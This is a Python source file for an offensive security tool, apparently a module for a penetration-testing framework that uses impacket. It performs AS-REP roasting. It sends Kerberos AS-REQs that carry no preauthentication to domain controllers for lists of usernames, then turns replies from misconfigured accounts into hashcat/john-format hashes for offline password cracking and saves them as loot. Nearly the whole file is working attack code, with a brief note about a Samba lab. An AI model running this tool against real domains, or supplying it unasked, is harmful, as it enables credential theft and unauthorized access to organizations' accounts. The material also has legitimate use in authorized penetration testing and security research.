"""AS-REP roast: grab crackable hashes from accounts without Kerberos preauth.

Why this works: accounts flagged DONT_REQUIRE_PREAUTH will get an AS-REP
from the KDC for anyone who asks — no credentials needed at all. The
reply's encrypted part is sealed with the account's password-derived key,
so it cracks offline like a kerberoast hash. The attack surface is the
misconfiguration itself: preauth exists precisely to prevent this.

No creds required — just usernames (USERS, or a USER_FILE of candidates).
Accounts that require preauth are skipped cleanly (that's the expected
answer from a healthy DC).

LAB NOTE: AS-REP roasting works against the bundled Samba lab — but only
because the lab flips all THREE Samba switches for it ([kdc]
require-preauth = no in the KDC's own krb5.conf, DONT_REQ_PREAUTH on the
target AND on krbtgt; Heimdal's require_preauth_p is an OR of the three).
A stock Samba DC demands preauth from every account; a Windows DC needs
only the account flag. Verified against the lab: noauth roasts and the
hash decrypts with its NT hash.
"""

import datetime
import random

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString
from core.wordlists import creds_from_options

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP, AS_REQ, seq_set, seq_set_iter
    from impacket.krb5.kerberosv5 import KerberosError, sendReceive
    from impacket.krb5.types import KerberosTime, Principal
    from pyasn1.codec.der import decoder, encoder
except ImportError:
    constants = KerberosError = Principal = None
    AS_REP = AS_REQ = KerberosTime = seq_set = seq_set_iter = None
    decoder = encoder = sendReceive = None


def build_as_req(user, domain):
    """AS-REQ with no preauthentication data — the whole attack, in one packet."""
    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    req_body = seq_set(as_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.proxiable.value,
    ])
    req_body["realm"] = domain
    name = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    seq_set(req_body, "cname", name.components_to_asn1)
    server = Principal(f"krbtgt/{domain}",
                       type=constants.PrincipalNameType.NT_SRV_INST.value)
    seq_set(req_body, "sname", server.components_to_asn1)
    now = datetime.datetime.utcnow()
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (int(constants.EncryptionTypes.rc4_hmac.value),))
    return encoder.encode(as_req)


def asrep_to_hash(user, domain, enc_part):
    """Format an AS-REP encrypted part as a hashcat/john hash."""
    raw = bytes(enc_part)
    return f"$krb5asrep$23${user}@{domain}:{raw[:16].hex()}${raw[16:].hex()}"


class AsRepRoast(AuxiliaryModule):
    name = "AS-REP Roast"
    description = """
        Requests AS-REPs for usernames without any credentials and turns
        the replies into crackable hashes (loot type 'hash') for accounts
        flagged DONT_REQUIRE_PREAUTH. Healthy accounts answer
        KDC_ERR_PREAUTH_REQUIRED and are skipped — a hit means a
        misconfigured account you can crack offline.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller(s), comma-separated"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERS", default="",
                                   description="Usernames, comma-separated"))
        self.options.add(OptString("USER_FILE", default="",
                                   description="File of usernames, one per line"))

    def run(self):
        try:
            raw = creds_from_options(self.get_option, "USERS", "USER_FILE")
        except OSError as e:
            self.print_error(f"Cannot read user file: {e}")
            return
        users = [u.strip() for value in raw for u in value.split(",") if u.strip()]
        if not users:
            self.print_error("Need at least one username (USERS/USER_FILE)")
            return
        domain = str(self.get_option("DOMAIN"))
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._roast(host, domain, users)

    def _roast(self, host, domain, users):
        store = getattr(self.framework, "store", None)
        hits = 0
        for user in users:
            try:
                response = sendReceive(build_as_req(user, domain), domain, host)
            except KerberosError as e:
                code = e.getErrorCode()
                if code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                    self.print_debug(f"{user}: preauth required (healthy) — skipped")
                elif code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                    self.print_debug(f"{user}: unknown user — skipped")
                else:
                    self.print_error(f"{user}: KDC error {code}")
                continue
            except OSError as e:
                self.print_error(f"{host}: {e}")
                return

            # sendReceive RETURNS (not raises) the KRB_ERROR packet when the
            # code is PREAUTH_REQUIRED — the healthy answer. Skip it.
            if response[0] == 0x7E:  # [APPLICATION 30] KRB_ERROR
                self.print_debug(f"{user}: preauth required (healthy) — skipped")
                continue

            as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]
            ticket_hash = asrep_to_hash(user, domain, as_rep["enc-part"]["cipher"])
            hits += 1
            self.print_good(f"{user}: {ticket_hash[:60]}...")
            self.print_debug(f"{user}: full hash: {ticket_hash}")
            if store is not None:
                store.add_loot("hash", f"krb5asrep {user} @ {host}",
                               ticket_hash, address=host)
        self.print_status(f"{host}: {hits}/{len(users)} roastable")
